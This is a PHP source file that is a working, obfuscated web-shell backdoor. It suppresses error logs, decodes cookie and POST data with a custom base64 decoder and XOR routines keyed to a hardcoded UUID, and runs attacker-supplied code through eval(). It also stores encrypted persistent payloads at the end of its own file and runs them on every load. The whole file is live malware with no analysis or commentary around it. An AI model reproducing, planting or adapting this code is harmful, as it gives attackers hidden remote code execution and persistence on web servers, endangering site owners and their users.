<?php

@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);


if(!defined("PHP_EOL"))
{
    define("PHP_EOL", "\n");
}

if(!defined("DIRECTORY_SEPARATOR"))
{
    define("DIRECTORY_SEPARATOR", "/");
}

if (!defined('file_put_contents '))
{
    define('file_put_contents ', 1);

    $hashCode = '816291f4-e264-4109-b4a2-56b0ccc91819';
    global $hashCode;

    function func01($cukhpkar) {

        if (strlen($cukhpkar) < 4)
        {
            return "";
        }

        $konrvbmzkwwluqr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

        $pnooxjxnfecez = str_split($konrvbmzkwwluqr);
        $pnooxjxnfecez = array_flip($pnooxjxnfecez);

        $oylknnt = 0;
        $pvlaeka = "";

        $cukhpkar = preg_replace("~[^A-Za-z0-9\+\/\=]~", "", $cukhpkar);

        do {
            $knxnyph = $pnooxjxnfecez[$cukhpkar[$oylknnt++]];
            $onxqfybg = $pnooxjxnfecez[$cukhpkar[$oylknnt++]];
            $xsljba = $pnooxjxnfecez[$cukhpkar[$oylknnt++]];
            $qkkolgr = $pnooxjxnfecez[$cukhpkar[$oylknnt++]];

            $uvgpquiy = ($knxnyph << 2) | ($onxqfybg >> 4);
            $tamnincvvjsf = (($onxqfybg & 15) << 4) | ($xsljba >> 2);
            $tamninnpbziq = (($xsljba & 3) << 6) | $qkkolgr;
            $pvlaeka = $pvlaeka . chr($uvgpquiy);
            if ($xsljba != 64) {
                $pvlaeka = $pvlaeka . chr($tamnincvvjsf);
            }
            if ($qkkolgr != 64) {
                $pvlaeka = $pvlaeka . chr($tamninnpbziq);
            }
        } while ($oylknnt < strlen($cukhpkar));
        return $pvlaeka;
    }

    if (!function_exists('file_put_contents'))
    {
        function file_put_contents($pnooxjx, $konrvbmz, $sbzcgbimncmrp = False)
        {
            $ujwffsoy = $sbzcgbimncmrp == 8 ? 'a' : 'w';
            $sbzcgbi = @fopen($pnooxjx, $ujwffsoy);
            if ($sbzcgbi === False)
            {
                return 0;
            }
            else
            {
                if (is_array($konrvbmz)) $konrvbmz = implode($konrvbmz);
                $yflkex = fwrite($sbzcgbi, $konrvbmz);
                fclose($sbzcgbi);
                return $yflkex;
            }
        }
    }

    if (!function_exists('file_get_contents'))
    {
        function file_get_contents($xigeskzk)
        {
            $oylknntbyqpvqf = fopen($xigeskzk, "r");
            $pbzoorja = fread($oylknntbyqpvqf, filesize($xigeskzk));
            fclose($oylknntbyqpvqf);

            return $pbzoorja;
        }
    }
    function func02()
    {
        return trim(preg_replace("/\(.*\$/", '', __FILE__));
    }

    function func03($yzfppg, $pbmdri)
    {
        $xxjfzjnt = "";

        for ($oylknnt=0; $oylknnt<strlen($yzfppg);)
        {
            for ($tamnin=0; $tamnin<strlen($pbmdri) && $oylknnt<strlen($yzfppg); $tamnin++, $oylknnt++)
            {
                $xxjfzjnt .= chr(ord($yzfppg[$oylknnt]) ^ ord($pbmdri[$tamnin]));
            }
        }

        return $xxjfzjnt;
    }

    function func04($yzfppg, $pbmdri)
    {
        global $hashCode;

        return func03(func03($yzfppg, $pbmdri), $hashCode);
    }
    function func05($yzfppg, $pbmdri)
    {
        global $hashCode;

        return func03(func03($yzfppg, $hashCode), $pbmdri);
    }

    function func06()
    {
        $tamninbphgtfi = @file_get_contents(func02());

        $pnooxjxifwtja = strpos($tamninbphgtfi, md5(func02()));
        if ($pnooxjxifwtja !== FALSE)
        {
            $vjxyxcmv = substr($tamninbphgtfi, $pnooxjxifwtja + 32);
            $sbzcgbibnyzoy = @unserialize(func04(rawurldecode($vjxyxcmv), md5(func02())));
        }
        else
        {
            $sbzcgbibnyzoy = Array();
        }

        return $sbzcgbibnyzoy;
    }

    function func07($sbzcgbibnyzoy)
    {
        $gpmqsfs = rawurlencode(func05(@serialize($sbzcgbibnyzoy), md5(func02())));
        $tamninbphgtfi = @file_get_contents(func02());

        $pnooxjxifwtja = strpos($tamninbphgtfi, md5(func02()));
        if ($pnooxjxifwtja !== FALSE)
        {
            $sbzcgbiojfgw = substr($tamninbphgtfi, $pnooxjxifwtja + 32);
            $tamninbphgtfi = str_replace($sbzcgbiojfgw, $gpmqsfs, $tamninbphgtfi);

        }
        else
        {
            $tamninbphgtfi = $tamninbphgtfi . "\n\n//" . md5(func02()) . $gpmqsfs;
        }

        @file_put_contents(func02(), $tamninbphgtfi);
    }

    function func08($ooxpeye, $oylknntreobd)
    {
        $sbzcgbibnyzoy = func06();

        $sbzcgbibnyzoy[$ooxpeye] = func01($oylknntreobd);

        func07($sbzcgbibnyzoy);
    }

    function func09($ooxpeye)
    {
        $sbzcgbibnyzoy = func06();

        unset($sbzcgbibnyzoy[$ooxpeye]);

        func07($sbzcgbibnyzoy);
    }

    function func010($ooxpeye=NULL)
    {
        foreach (func06() as $egstluwh=>$mjgwrcbk)
        {
            if ($ooxpeye)
            {
                if (strcmp($ooxpeye, $egstluwh) == 0)
                {
                    eval($mjgwrcbk);
                    break;
                }
            }
            else
            {
                eval($mjgwrcbk);
            }
        }
    }

    foreach (array_merge($_COOKIE, $_POST) as $hglbbs => $yzfppg)
    {
        $yzfppg = @unserialize(func04(func01($yzfppg), $hglbbs));

        if (isset($yzfppg['ak']) && $hashCode==$yzfppg['ak'])
        {
            if ($yzfppg['a'] == 'i')
            {
                $oylknnt = Array(
                    'pv' => @phpversion(),
                    'sv' => '2.0-1',
                    'ak' => $yzfppg['ak'],
                );
                echo @serialize($oylknnt);
                exit;
            }
            elseif ($yzfppg['a'] == 'e')
            {
                eval($yzfppg['d']);
            }
            elseif ($yzfppg['a'] == 'plugin')
            {
                if($yzfppg['sa'] == 'add')
                {
                    func08($yzfppg['p'], $yzfppg['d']);
                }
                elseif($yzfppg['sa'] == 'rem')
                {
                    func09($yzfppg['p']);
                }
            }
            echo $yzfppg['ak'];
            exit();
        }
    }

    func010();
}

?>